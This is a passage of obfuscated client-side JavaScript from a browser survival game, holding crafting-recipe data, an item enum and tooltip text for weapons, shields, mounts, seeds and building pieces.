				[ᐃᐃ.ⲆⵠᐃΔΔ, 1],
				[ᐃᐃ.ΔⲆΔⵠΔ, Ⲇᐃⵠ],
				[ᐃᐃ.ᐃⲆΔⲆⲆ, ΔⲆΔⲆⲆ],
				[ᐃᐃ.ΔΔΔΔᐃ, 5],
				[ᐃᐃ.ΔⲆᐃⲆⲆ, 8]
			],
			w: 1,
			f: 0,
			"ᐃⲆΔ": 0,
			e: 0,
			id: ᐃᐃⲆ.ΔᐃᐃΔᐃ,
			"ⵠΔᐃⲆ": ᐃᐃ.ΔᐃᐃΔᐃ,
			time: ΔⲆⵠ / 60,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ΔⲆΔⵠᐃ
		}, {
			r: [
				[ᐃᐃ.ⲆⲆΔⲆᐃ, 1],
				[ᐃᐃ.ΔⲆⵠᐃⲆ, 1],
				[ᐃᐃ.ᐃⲆΔⲆⲆ, 10],
				[ᐃᐃ.ΔΔΔΔᐃ, 5],
				[ᐃᐃ.ΔⲆᐃⲆⲆ, ⲆⲆᐃⵠΔ]
			],
			w: ⵠΔⲆ,
			f: 0,
			"ᐃⲆΔ": ⲆⲆⲆᐃ,
			e: 0,
			id: ᐃᐃⲆ.ᐃΔⲆᐃⲆ,
			"ⵠΔᐃⲆ": ᐃᐃ.ᐃΔⲆᐃⲆ,
			time: 1 / 60,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ΔⲆΔⵠᐃ
		}, {
			r: [
				[ᐃᐃ.Δⵠⵠⵠⵠ, 1]
			],
			w: ⲆΔⵠ,
			f: ΔᐃΔΔ,
			"ᐃⲆΔ": 1,
			e: 0,
			id: ᐃᐃⲆ.ΔⵠⵠⵠΔ,
			"ⵠΔᐃⲆ": ᐃᐃ.ΔⵠⵠⵠΔ,
			time: ΔⲆⵠ / 5,
			"ΔᐃⲆ": ⵠⲆΔᐃ.Δⵠⵠⵠᐃ
		}, {
			r: [
				[ᐃᐃ.ⵠⲆⲆᐃ, Δⵠᐃᐃᐃ],
				[ᐃᐃ.ᐃᐃᐃΔΔ, 1]
			],
			w: ⵠΔⲆ,
			f: 0,
			"ᐃⲆΔ": 0,
			e: 0,
			id: ᐃᐃⲆ.Δⵠⵠⵠⵠ,
			"ⵠΔᐃⲆ": ᐃᐃ.Δⵠⵠⵠⵠ,
			time: ᐃᐃⲆΔ / ⲆΔΔᐃ,
			"ΔᐃⲆ": ⵠⲆΔᐃ.Δⵠⵠⵠᐃ
		}, {
			r: [
				[ᐃᐃ.ᐃᐃΔⲆ, 100],
				[ᐃᐃ.ⲆⵠΔⲆᐃ, 30]
			],
			w: ᐃⲆᐃ,
			f: ⵠⲆΔ,
			"ᐃⲆΔ": 0,
			e: 0,
			id: ᐃᐃⲆ.ΔⲆᐃΔⵠ,
			"ⵠΔᐃⲆ": ᐃᐃ.ΔⲆᐃΔⵠ,
			time: Ⲇᐃⵠ / ⵠⵠΔⲆᐃ,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ⲆΔᐃⵠⲆ
		}, {
			r: [
				[ᐃᐃ.ⵠⲆⲆᐃ, Δⵠᐃᐃᐃ]
			],
			w: ᐃΔᐃⲆ,
			f: ⵠΔⲆⵠ,
			"ᐃⲆΔ": 0,
			e: 0,
			id: ᐃᐃⲆ.ᐃⵠᐃⲆᐃ,
			"ⵠΔᐃⲆ": ᐃᐃ.ᐃⵠᐃⲆᐃ,
			time: ᐃᐃⵠ / 5,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ⲆΔᐃⵠⲆ
		}, {
			r: [
				[ᐃᐃ.ⵠⲆⲆᐃ, 100],
				[ᐃᐃ.ᐃᐃΔⲆ, 50],
				[ᐃᐃ.ⲆᐃⵠⲆᐃ, ⵠⲆⵠⵠ],
				[ᐃᐃ.ΔᐃᐃᐃΔ, 5],
				[ᐃᐃ.ᐃᐃᐃΔΔ, ᐃⲆⲆⲆ]
			],
			w: ᐃᐃⲆΔ,
			f: 0,
			"ᐃⲆΔ": ⵠⲆⲆ,
			e: ᐃΔΔ,
			id: ᐃᐃⲆ.ⲆⲆⲆⲆΔ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⲆⲆⲆⲆΔ,
			time: ᐃᐃⲆΔ / 20,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ⲆΔᐃⵠⲆ
		}, {
			r: [
				[ᐃᐃ.ⵠⲆⲆᐃ, 250],
				[ᐃᐃ.ΔΔΔΔᐃ, 10],
				[ᐃᐃ.ᐃⲆΔⲆⲆ, ⲆΔΔⵠ],
				[ᐃᐃ.ⲆⲆⲆᐃᐃ, 2]
			],
			w: 1,
			f: ΔⲆⲆ,
			"ᐃⲆΔ": 0,
			e: 0,
			id: ᐃᐃⲆ.ⵠΔΔⲆⵠ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⵠΔΔⲆⵠ,
			time: .02,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ⲆΔᐃⵠⲆ
		}, {
			r: [
				[ᐃᐃ.ⵠⲆⲆᐃ, 250],
				[ᐃᐃ.ᐃᐃᐃΔΔ, ⲆⲆⲆΔᐃ],
				[ᐃᐃ.ᐃⲆΔⲆⲆ, 2],
				[ᐃᐃ.ΔⲆᐃⲆⲆ, ⲆⲆᐃᐃⲆ]
			],
			w: 1,
			f: 0,
			"ᐃⲆΔ": ΔΔⵠ,
			e: ᐃⵠⲆ,
			id: ᐃᐃⲆ.ᐃᐃΔΔⵠ,
			"ⵠΔᐃⲆ": ᐃᐃ.ᐃᐃΔΔⵠ,
			time: ᐃᐃⵠ / 50,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ⲆΔᐃⵠⲆ
		}, {
			r: [
				[ᐃᐃ.ᐃᐃᐃΔΔ, 10],
				[ᐃᐃ.ΔᐃᐃᐃΔ, ⵠⲆⵠⲆΔ],
				[ᐃᐃ.ⲆᐃⵠⲆᐃ, 4],
				[ᐃᐃ.ΔⲆⲆΔⵠ, 50]
			],
			w: ΔⲆᐃᐃ,
			f: ΔᐃΔΔ,
			"ᐃⲆΔ": 0,
			e: ⲆⲆⲆᐃ,
			id: ᐃᐃⲆ.ⲆⵠΔⲆⲆ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⲆⵠΔⲆⲆ,
			time: .05,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ⲆΔᐃⵠⲆ
		}, {
			r: [
				[ᐃᐃ.ⵠⲆⲆᐃ, 250],
				[ᐃᐃ.ᐃᐃᐃΔΔ, ᐃⵠΔⵠⵠ],
				[ᐃᐃ.ⵠΔⵠΔⲆ, 10],
				[ᐃᐃ.ⵠᐃⲆᐃᐃ, ⵠⵠᐃΔⲆ]
			],
			w: ⵠᐃⵠΔ,
			f: 0,
			"ᐃⲆΔ": 0,
			e: 0,
			id: ᐃᐃⲆ.ΔᐃⲆΔᐃ,
			"ⵠΔᐃⲆ": ᐃᐃ.ΔᐃⲆΔᐃ,
			time: ⵠΔⲆ / 50,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ⲆΔᐃⵠⲆ
		}, {
			r: [
				[ᐃᐃ.ⵠⲆⲆᐃ, 40]
			],
			w: ⵠΔΔ,
			f: ΔⲆⲆ,
			"ᐃⲆΔ": ΔΔⵠⵠ,
			e: 0,
			id: ᐃᐃⲆ.ⲆᐃⵠⵠΔ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⲆᐃⵠⵠΔ,
			time: .2,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ᐃⲆⲆⲆΔ
		}, {
			r: [
				[ᐃᐃ.ⲆᐃⵠⵠΔ, ᐃΔᐃⲆ],
				[ᐃᐃ.ᐃᐃΔⲆ, 40],
				[ᐃᐃ.ⵠⲆⲆᐃ, 50]
			],
			w: 1,
			f: ⲆΔⵠ,
			"ᐃⲆΔ": 0,
			e: ⵠⲆⲆ,
			id: ᐃᐃⲆ.ⲆΔΔⵠⵠ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⲆΔΔⵠⵠ,
			time: 1 / 10,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ᐃⲆⲆⲆΔ
		}, {
			r: [
				[ᐃᐃ.ⲆΔΔⵠⵠ, ⵠᐃⵠΔ],
				[ᐃᐃ.ΔⲆⵠⵠ, 40],
				[ᐃᐃ.ᐃᐃΔⲆ, 50],
				[ᐃᐃ.ⵠⲆⲆᐃ, 60]
			],
			w: 1,
			f: ⲆⲆⲆᐃ,
			"ᐃⲆΔ": ⲆⲆⲆᐃ,
			e: ⵠΔⲆⵠ,
			id: ᐃᐃⲆ.ⵠΔⲆΔΔ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⵠΔⲆΔΔ,
			time: ⵠΔⲆ / ⵠⵠΔΔᐃ,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ᐃⲆⲆⲆΔ
		}, {
			r: [
				[ᐃᐃ.ⵠΔⲆΔΔ, ᐃⲆᐃ],
				[ᐃᐃ.ΔⲆᐃΔ, 40],
				[ᐃᐃ.ΔⲆⵠⵠ, 70],
				[ᐃᐃ.ᐃᐃΔⲆ, 80]
			],
			w: 1,
			f: 0,
			"ᐃⲆΔ": ΔⲆⲆ,
			e: Δⵠᐃ,
			id: ᐃᐃⲆ.ⵠⲆᐃⵠᐃ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⵠⲆᐃⵠᐃ,
			time: .03333333333333333,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ᐃⲆⲆⲆΔ
		}, {
			r: [
				[ᐃᐃ.ⵠⲆᐃⵠᐃ, ⲆⵠⲆⲆ],
				[ᐃᐃ.ⲆⵠΔⲆ, 40],
				[ᐃᐃ.ΔⲆᐃΔ, 70],
				[ᐃᐃ.ΔⲆⵠⵠ, 110]
			],
			w: ᐃⲆᐃ,
			f: 0,
			"ᐃⲆΔ": 0,
			e: 0,
			id: ᐃᐃⲆ.ΔΔⵠⵠⲆ,
			"ⵠΔᐃⲆ": ᐃᐃ.ΔΔⵠⵠⲆ,
			time: .016666666666666666,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ᐃⲆⲆⲆΔ
		}, {
			r: [
				[ᐃᐃ.ΔΔⵠⵠⲆ, ⵠᐃⵠΔ],
				[ᐃᐃ.ⲆΔᐃᐃ, 50],
				[ᐃᐃ.ⲆⵠΔⲆ, 80],
				[ᐃᐃ.ΔⲆᐃΔ, 110]
			],
			w: 1,
			f: 0,
			"ᐃⲆΔ": ΔⲆⵠⲆ,
			e: 0,
			id: ᐃᐃⲆ.ΔⲆᐃⵠⲆ,
			"ⵠΔᐃⲆ": ᐃᐃ.ΔⲆᐃⵠⲆ,
			time: .011111111111111112,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ᐃⲆⲆⲆΔ
		}];
		const ᐃⵠⵠⲆⵠ = ᐃⵠΔⵠⲆⲆⲆ;
		var ᐃⲆ = 300;
		ⲆⲆΔ = {
			"ᐃⵠⲆΔⲆⲆⲆ": ᐃⲆ++,
			"ⲆⲆᐃⲆΔΔᐃ": ᐃⲆ++,
			"ΔᐃⵠⵠΔⲆⲆ": ᐃⲆ++,
			"ᐃᐃⵠⵠΔᐃⵠ": ᐃⲆ++,
			"ⵠΔΔⲆΔᐃⵠ": ᐃⲆ++,
			"ᐃΔΔΔⵠⵠᐃ": ᐃⲆ++,
			"ᐃⲆᐃⲆⵠⲆᐃ": ᐃⲆ++,
			"ΔⵠⲆΔⵠᐃΔ": ᐃⲆ++,
			"ⲆⲆΔΔⲆᐃᐃ": ᐃⲆ++,
			"ᐃΔᐃⲆᐃⵠⵠ": ᐃⲆ++,
			"ΔΔⵠⵠⲆⲆᐃ": ᐃⲆ++,
			"ⵠᐃⵠⲆⵠΔΔ": ᐃⲆ++,
			EMPTY: ᐃⲆ++,
			"ΔᐃⲆᐃⲆⲆⲆ": ᐃⲆ++,
			"ΔᐃΔⲆᐃⲆⲆ": ᐃⲆ++,
			"ⲆⲆⲆⲆᐃᐃᐃ": ᐃⲆ++,
			"ΔⵠⵠⲆΔⵠᐃ": ᐃⲆ++,
			"ⲆⵠΔⵠᐃᐃΔ": ᐃⲆ++,
			"ⵠⲆΔᐃⲆⵠΔ": ᐃⲆ++,
			"ᐃᐃⲆᐃᐃΔⲆ": ᐃⲆ++,
			"ΔΔᐃᐃⵠⵠΔ": ᐃⲆ++,
			"ⵠⵠⵠⵠⵠⵠᐃ": ᐃⲆ++,
			"ᐃⵠᐃΔⲆ": ᐃⲆ++,
			"ᐃⵠᐃⲆⲆⵠⲆ": ᐃⲆ++,
			"ⵠⲆⵠⵠⲆ": ᐃⲆ++,
			"ⲆⲆⲆᐃⵠⲆⲆ": ᐃⲆ++,
			"ⲆⵠΔⵠᐃΔᐃ": ᐃⲆ++,
			"ⵠⲆⵠⲆⲆᐃᐃ": ᐃⲆ++,
			"ᐃⲆΔᐃᐃⵠᐃ": ᐃⲆ++,
			"ΔⵠⵠᐃᐃΔⵠ": ᐃⲆ++,
			"ΔⵠᐃⲆⲆⲆΔ": ᐃⲆ++,
			"ⲆᐃΔᐃᐃᐃⵠ": ᐃⲆ++,
			POINTS: ᐃⲆ++,
			"ⵠΔΔᐃᐃᐃⵠ": ᐃⲆ++,
			"ⲆᐃⵠⵠΔΔΔ": ᐃⲆ++,
			"ⲆᐃᐃⵠⲆⲆᐃ": ᐃⲆ++,
			"ΔΔⲆΔⲆᐃⲆ": ᐃⲆ++,
			"ΔⲆⲆΔᐃⲆᐃ": ᐃⲆ++,
			"ΔⲆΔᐃⲆⲆᐃ": ᐃⲆ++,
			"ᐃᐃᐃⲆⵠⲆⲆ": ᐃⲆ++,
			"ⵠⵠⲆΔᐃⵠᐃ": ᐃⲆ++,
			"ⲆᐃⵠⲆΔΔᐃ": ᐃⲆ++,
			"ⲆᐃΔⲆᐃⵠΔ": ᐃⲆ++,
			"ⵠⵠⵠᐃⲆΔΔ": ᐃⲆ++
		};
		var ΔⵠᐃᐃⲆᐃΔ = function() {
			ΔⵠΔ[ᐃᐃ.ΔⲆᐃⵠⲆ] = ["Reidite Axe", "Legendary and lethal", "Damage: 33", "Shield Penetration: 6"];
			ΔⵠΔ[ᐃᐃ.ΔΔⵠⵠⲆ] = ["Amethyst Axe", "Purple and powerful", ⵠ[166], "Shield Penetration: 5"];
			ΔⵠΔ[ᐃᐃ.ⵠⲆᐃⵠᐃ] = ["Diamond Axe", "Sparkle and slice", "Damage: 27", "Shield Penetration: 4"];
			ΔⵠΔ[ᐃᐃ.ⵠΔⲆΔΔ] = ["Gold Axe", "Chop 'til it drops!", ⵠ[244], "Shield Penetration: 3"];
			ΔⵠΔ[ᐃᐃ.ⲆΔΔⵠⵠ] = ["Stone Axe", "Rock your logs", "Damage: 21", "Shield Penetration: 2"];
			ΔⵠΔ[ᐃᐃ.ⲆᐃⵠⵠΔ] = ["Wood Axe", "Eco-friendly deforestation!", ⵠ[449], "Shield Penetration: 1"];
			ΔⵠΔ[ᐃᐃ.ᐃⵠᐃⲆⵠ] = ["Stone Extractor", "Can produce stone with wood", "It takes 10 seconds to drill Stone", ⵠ[155]];
			ΔⵠΔ[ᐃᐃ.ⲆΔΔΔᐃ] = ["Gold Extractor", "Can produce gold with wood", "It takes 10 seconds to drill Gold", ⵠ[155]];
			ΔⵠΔ[ᐃᐃ.ⵠⵠΔⵠⵠ] = ["Diamond Extractor", "Can produce diamond with wood", "It takes 10 seconds to drill Diamond", ⵠ[155]];
			ΔⵠΔ[ᐃᐃ.ᐃᐃΔⲆⲆ] = ["Amethyst Extractor", "Can produce amethyst with wood", "It takes 10 seconds to drill Amethyst", ⵠ[155]];
			ΔⵠΔ[ᐃᐃ.ⵠᐃΔⲆᐃ] = ["Reidite Extractor", "Can produce reidite with wood", "It takes 10 seconds to drill Reidite", ⵠ[155]];
			ΔⵠΔ[ᐃᐃ.ᐃᐃᐃⵠΔ] = ["Reidite Shield", "A must for the pros of the getaway", ⵠ[483], "Damage: 6", "Players Defense: 6"];
			ΔⵠΔ[ᐃᐃ.ⲆⵠⵠΔᐃ] = ["Amethyst Shield", "Because you know how to run away in style", ⵠ[483], ⵠ[60], "Players Defense: 5"];
			ΔⵠΔ[ᐃᐃ.ⲆᐃⵠᐃⲆ] = ["Diamond Shield", "Run or attack, you've obviously made your choice.", ⵠ[483], ⵠ[162], ⵠ[68]];
			ΔⵠΔ[ᐃᐃ.ⲆΔⲆⵠⵠ] = ["Gold Shield", "When it's golden, it's always better.", ⵠ[483], ⵠ[574], "Players Defense: 3"];
			ΔⵠΔ[ᐃᐃ.ΔᐃⵠΔⲆ] = ["Stone Shield", "Protects you a bit more", ⵠ[483], ⵠ[313], "Players Defense: 2"];
			ΔⵠΔ[ᐃᐃ.ⵠⲆⲆⲆΔ] = ["Wood Shield", "Protects you a bit", ⵠ[483], ⵠ[23], "Players Defense: 1"];
			ΔⵠΔ[ᐃᐃ.ΔΔⵠᐃⵠ] = ["Machete", "You gather more from mob boxes", "Useless to attack mobs", "Damage against Players: 5"];
			ΔⵠΔ[ᐃᐃ.ⲆⵠΔΔⵠ] = ["Tower", "Allows you to shoot over walls with a bow", "Does not allow to pass through roofs"];
			ΔⵠΔ[ᐃᐃ.ᐃⵠⲆⵠⵠ] = ["Dragon Arrow", "Must be used with a Dragon Bow", "Damage: 45", "Mobs Damage: 1200", "Building Damage: 45"];
			ΔⵠΔ[ᐃᐃ.ᐃᐃΔⵠᐃ] = ["Dragon Bow", "Also called the One-Shot-Monster", "Requiers arrows to be used"];
			ΔⵠΔ[ᐃᐃ.ⲆⵠⲆΔᐃ] = ["Reidite Arrow", "Must be used with a Reidite or a Dragon Bow", "Damage: 40", "Mobs Damage: 900", "Building Damage: 40"];
			ΔⵠΔ[ᐃᐃ.ⵠΔΔⵠⵠ] = ["Reidite Bow", "Makes the most terrifying monster cry.", "Requiers any arrows, except dragon arrows, to be used"];
			ΔⵠΔ[ᐃᐃ.ᐃⵠⵠΔⲆ] = ["Amethyst Arrow", "Must be used with Amethyst, Reidite or Dragon Bow", "Damage: 35", "Mobs Damage: 600", "Building Damage: 35"];
			ΔⵠΔ[ᐃᐃ.ⲆⲆᐃᐃΔ] = ["Amethyst Bow", "It's super efficient!", "Requiers any arrows, except dragon and reidite arrows, to be used"];
			ΔⵠΔ[ᐃᐃ.ⵠᐃᐃΔⵠ] = ["Diamond Arrow", "Must be used with Diamond, Amethyst, Reidite or Dragon Bow", ⵠ[166], "Mobs Damage: 300", "Building Damage: 30"];
			ΔⵠΔ[ᐃᐃ.ᐃⵠΔⵠΔ] = ["Diamond Bow", "Like a Robin Wood who would keep the diamonds", "Requiers wood, stone, gold or diamond arrows to be used"];
			ΔⵠΔ[ᐃᐃ.ΔⵠⲆⲆⲆ] = ["Gold Arrow", "Must be used with a Bow, except a wooden and stone one", "Damage: 25", "Mobs Damage: 200", "Building Damage: 25"];
			ΔⵠΔ[ᐃᐃ.ᐃⲆⵠⲆⵠ] = ["Gold Bow", "When it's golden, it's better.", "Requiers wood, stone or gold arrows to be used"];
			ΔⵠΔ[ᐃᐃ.ⲆΔᐃⲆⵠ] = ["Stone Arrow", "Must be used with a Bow, except a wooden one", ⵠ[511], "Mobs Damage: 100", "Building Damage: 20"];
			ΔⵠΔ[ᐃᐃ.ᐃΔⲆᐃΔ] = ["Stone Bow", "Like Robin Wood", "Requiers wood and stone arrows to be used"];
			ΔⵠΔ[ᐃᐃ.ΔᐃΔΔᐃ] = ["Wood Arrow", "Must be used with any bow", "Damage: 15", "Mobs Damage: 20", "Building Damage: 15"];
			ΔⵠΔ[ᐃᐃ.ⵠᐃΔⲆⵠ] = ["Wood Bow", "A little bow that does not do many damages.", "Requiers wood arrows to be used"];
			ΔⵠΔ[ᐃᐃ.ΔᐃΔⲆᐃ] = [ⵠ[159], "Allows to automatically generate score points.", "Be careful, you can only build one.", "Once placed your soul is connected to the machine, if the machine is destroyed, you will die.", "The machine can't be build in the sea", "You earn more points in the desert, than in the lava, than in winter, than in the forest."];
			ΔⵠΔ[ᐃᐃ.ΔΔᐃΔᐃ] = ["Boar fur", "Hakuna Matata, well, he can no longer say it"];
			ΔⵠΔ[ᐃᐃ.ⵠⲆᐃΔΔ] = ["Mammoth fur", "Soft and warm. Perfect for a hat."];
			ΔⵠΔ[ᐃᐃ.ᐃⲆΔᐃΔ] = ["Vulture Feather", "From a deadly vulture"];
			ΔⵠΔ[ᐃᐃ.ⵠⲆⲆᐃᐃ] = ["Emerald", "How many golden breads can you get from it?"];
			ΔⵠΔ[ᐃᐃ.ⵠΔᐃⵠᐃ] = ["Sand Worm Juice", "I don't want to know how you got this."];
			ΔⵠΔ[ᐃᐃ.ⲆⲆΔᐃᐃ] = ["Turban", "Useful to survive in the desert."];
			ΔⵠΔ[ᐃᐃ.ⲆⲆⵠᐃᐃ] = ["Ninja outfit", "Essential to survive in the desert"];
			ΔⵠΔ[ᐃᐃ.ⵠⲆⵠΔⵠ] = ["Pilot Hat", "Take off and land with flying objects much faster."];
			ΔⵠΔ[ᐃᐃ.ΔⵠΔΔᐃᐃᐃ] = ["Pilot Glasses"];
			ΔⵠΔ[ᐃᐃ.ⲆᐃⵠⵠⲆ] = ["Tamed Boar", "Fast on lands and slow on water."];
			ΔⵠΔ[ᐃᐃ.ⲆⵠᐃⵠⲆ] = ["Tamed Baby Mammoth", "Fast on lands and slow on water."];
			ΔⵠΔ[ᐃᐃ.ᐃⵠᐃᐃΔ] = ["Tamed Crab Boss", "Fast on lands and water, and slow on winter.", "Gives a +10 damage bonus of the Crab Spear", "when holding a Crab Helmet"];
			ΔⵠΔ[ᐃᐃ.ⵠⲆᐃⲆᐃ] = ["Tamed Baby Dragon", "You can fly with it.", "Faster than a hawk", ⵠ[529], ⵠ[110]];
			ΔⵠΔ[ᐃᐃ.ΔⵠⵠΔⲆ] = ["Tamed Baby Lava Dragon", "You can fly with it.", "Faster than a baby dragon", ⵠ[529], ⵠ[110]];
			ΔⵠΔ[ᐃᐃ.ΔΔΔⲆⲆ] = ["Tamed Hawk", "You can fly with it.", ⵠ[529], ⵠ[110]];
			ΔⵠΔ[ᐃᐃ.ⲆⵠΔⲆⲆ] = ["Saddle", "Hit a boar with it to tame it."];
			ΔⵠΔ[ᐃᐃ.ⲆᐃⲆΔⵠ] = ["Witch Hat", "You're a wizard Starvy!"];
			ΔⵠΔ[ᐃᐃ.ⲆᐃᐃⵠⲆ] = ["Nimbus 2000", "That's not just a broomstick, Starvy, it's a Nimbus 2000!", "Only works with the witch hat."];
			ΔⵠΔ[ᐃᐃ.ⵠΔⲆⵠΔ] = ["Wand of life", "Soon we must all choose between what is right and what is easy.", "You need the witch hat and firefly to cast spell"];
			ΔⵠΔ[ᐃᐃ.ΔⵠᐃⵠⲆ] = ["Death Wand", "The wand of He-Who-Must-Not-Be-Named... Lapa...", "You need the witch hat and firefly to cast spell"];
			ΔⵠΔ[ᐃᐃ.ΔⵠⵠⲆᐃ] = ["Firefly", "They make a cute little squeak.", "However, you must tear off his wings to make magical projectiles for use with magic wands."];
			ΔⵠΔ[ᐃᐃ.ᐃⵠΔⲆᐃ] = ["Pirate hat", "You are faster with it in a boat", ⵠ[470]];
			ΔⵠΔ[ᐃᐃ.ᐃᐃΔΔⵠ] = ["Sled", "You are faster with it in the snow"];
			ΔⵠΔ[ᐃᐃ.ⵠΔΔⲆⵠ] = ["Boat", "You are faster with it in the water"];
			ΔⵠΔ[ᐃᐃ.ΔᐃⲆΔᐃ] = ["Plane", "Fly in the forest, ocean and winter", "Can't fly in desert or lava biome", ⵠ[529], ⵠ[110]];
			ΔⵠΔ[ᐃᐃ.ΔΔΔⵠΔ] = ["Reidite Hammer", ⵠ[34], "Damage: 6", "Building Damage: 70"];
			ΔⵠΔ[ᐃᐃ.ΔⲆᐃⲆⲆ] = ["Penguin Feather", "From a deadly cute penguin."];
			ΔⵠΔ[ᐃᐃ.ⵠᐃⲆᐃᐃ] = ["Hawk Feather", "From a deadly hawk."];
			ΔⵠΔ[ᐃᐃ.ⵠᐃΔᐃΔ] = [ⵠ[15], "Food : 20", "Water : 10"];
			ΔⵠΔ[ᐃᐃ.ⵠⵠᐃⲆᐃ] = ["Aloe Vera", "Allows you to heal a little", "Heal : 30"];
			ΔⵠΔ[ᐃᐃ.ΔᐃⲆⲆΔ] = ["Aloe Vera Seed", "Grows into Aloe Vera"];
			ΔⵠΔ[ᐃᐃ.ΔΔΔᐃⲆ] = ["Watermelon", "Like a melon, but with water", "Food : 15", "Water : 8"];
			ΔⵠΔ[ᐃᐃ.ᐃΔⵠⵠⲆ] = ["Watermelon Seed", "Grows into Watermelon", ⵠ[267], "Growth: 180s", "Need water: 3min 20s", ⵠ[463], ⵠ[32]];
			ΔⵠΔ[ᐃᐃ.ⵠⲆΔΔⵠ] = ["Reidite Door", "Noboby can destroy it. Except very reckless", ⵠ[60], "On-Hit Damage: 1", "Durability: 4000"];
			ΔⵠΔ[ᐃᐃ.ΔᐃΔᐃⵠ] = ["Reidite Wall", "Better wall in StarveLand", "Durability: 4000"];
			ΔⵠΔ[ᐃᐃ.ⵠᐃⲆᐃⲆ] = ["Reidite Spike", "It hurts", "Damage: 60", "On-Hit Damage: 5", "Durability: 3000"];
			ΔⵠΔ[ᐃᐃ.ⵠⵠⲆΔⵠ] = ["Reidite Door Spike", "Painful and useful at the same time", "Damage: 35", "On-Hit Damage: 4", ⵠ[155]];
			ΔⵠΔ[ᐃᐃ.ⵠⲆᐃΔⲆ] = ["Reidite Pickaxe", "Can also harvest reidite, better look!", "Damage: 6", ⵠ[127]];
			ΔⵠΔ[ᐃᐃ.ᐃᐃΔΔⲆ] = ["Wood Door Spike", "Can be opened or closed by you or your friends", ⵠ[60], "On-Hit Damage: 1", "Durability: 100"];
			ΔⵠΔ[ᐃᐃ.ⲆⲆΔⵠⵠ] = ["Stone Door Spike", "A stronger door is more serious", "Damage: 10", "On-Hit Damage: 2", "Durability: 200"];
			ΔⵠΔ[ᐃᐃ.ⲆᐃΔΔⲆ] = ["Gold Door Spike", 'Are you rebuilding the "el dorado?"', "Damage: 15", "On-Hit Damage: 2", ⵠ[463]];
			ΔⵠΔ[ᐃᐃ.ⲆⵠⲆᐃᐃ] = ["Diamond Door Spike", "For a shining house", "Damage: 25", ⵠ[466], "Durability: 800"];
			ΔⵠΔ[ᐃᐃ.ⵠΔⵠᐃⲆ] = ["Amethyst Door Spike", "Is your house a locked safe?", ⵠ[166], ⵠ[466], "Durability: 1600"];
			ΔⵠΔ[ᐃᐃ.ⵠⲆΔⲆΔ] = ["Carrot", "Eat it or sell it in exchange for Tomato Seed or Diamond", "Food : 20"];
			ΔⵠΔ[ᐃᐃ.ᐃⲆⲆᐃⵠ] = ["Tomato", "Eat it or sell it in exchange for Thornbush Seed or Amethyst", "Food : 16"];
			ΔⵠΔ[ᐃᐃ.ΔᐃⲆᐃⵠ] = ["Carrot Seed", "Grows into Carrot", ⵠ[267], "Growth: 30s", "Need water: 1min 40s", ⵠ[528], ⵠ[32]];
			ΔⵠΔ[ᐃᐃ.ⵠΔⲆᐃΔ] = ["Tomato Seed", "Grows into Tomato", ⵠ[267], "Growth: 30s", "Need water: 1min 40s", ⵠ[528], ⵠ[32]];
			ΔⵠΔ[ᐃᐃ.ᐃΔⲆᐃᐃ] = ["Pitchfork", "Perfect for gathering"];
			ΔⵠΔ[ᐃᐃ.ⵠΔᐃⵠΔ] = ["Golden Pitchfork", "Essential for a real farmer."];
			ΔⵠΔ[ᐃᐃ.ⵠⲆᐃΔⲆⵠⲆ] = ["Pitchfork Part", "Shaped by the gods. You'll never be hungry again."];
			ΔⵠΔ[ᐃᐃ.ΔᐃⵠΔΔᐃⵠ] = [ⵠ[332], "Eat it or sell it in exchange for wood or stone", "Food : 12"];
			ΔⵠΔ[ᐃᐃ.ᐃⵠᐃᐃⵠⵠΔ] = [ⵠ[332], "Eat it or sell it in exchange for gold", "Food : 25"];
			ΔⵠΔ[ᐃᐃ.ᐃᐃⵠⵠᐃᐃⵠ] = [ⵠ[332], "Eat it or sell it in exchange for diamond", "Food : 50"];
			ΔⵠΔ[ᐃᐃ.ΔⲆⲆⲆᐃⲆΔ] = [ⵠ[332], "Eat it or sell it in exchange for amethyst", "Food : 75"];
			ΔⵠΔ[ᐃᐃ.ΔΔⲆᐃⲆΔⲆ] = [ⵠ[332], "Eat it or sell it in exchange for reidite", "Food : 100"];
			ΔⵠΔ[ᐃᐃ.ΔΔᐃᐃᐃ] = ["Lava Cube", "You feel an immense power emanating from this cube"];
			ΔⵠΔ[ᐃᐃ.ⵠΔᐃⲆⲆ] = ["Lava Orb", "You feel an immense power emanating from this orb"];
			ΔⵠΔ[ᐃᐃ.ⵠⲆⵠⲆᐃ] = ["Lava Sword", "Don't be too mean with that.", "Damage: 33", "Building Damage: 11"];
			ΔⵠΔ[ᐃᐃ.ΔⲆⲆΔᐃ] = ["Lava Spear", "Doing good or doing evil", ⵠ[244], "Building Damage: 8"];
			ΔⵠΔ[ᐃᐃ.ⲆᐃⵠΔΔ] = ["Lava Heart", "You can feel a strange force.", "A huge power emanates from it.", "We must not find the secret."];
			ΔⵠΔ[ᐃᐃ.ⵠⵠᐃⵠΔ] = ["Lava Helmet", "You will conquer the world", "Players Defense: 9", "Animals Defense: 30"];
			ΔⵠΔ[ᐃᐃ.ΔⵠⲆⲆᐃ] = ["Reidite Spear", "Really useful against Lava Monsters", "Damage: 22", "Building Damage: 7"];
			ΔⵠΔ[ᐃᐃ.ⲆⵠⵠᐃΔ] = ["Reidite Sword", "Really useful against Lava Monsters", ⵠ[166], "Building Damage: 10"];
			ΔⵠΔ[ᐃᐃ.ΔⵠᐃᐃΔ] = ["Flame", "It's hot!"];
